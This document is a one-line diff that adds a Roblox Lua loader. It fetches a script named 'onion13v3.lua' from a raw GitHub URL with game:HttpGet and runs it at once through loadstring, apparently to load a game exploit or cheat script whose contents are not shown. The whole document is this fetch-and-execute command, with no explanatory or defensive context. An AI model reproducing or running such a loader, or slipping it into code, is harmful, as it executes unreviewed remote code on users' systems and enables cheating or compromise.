@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/v3/refs/heads/main/onion13v3.lua"))()
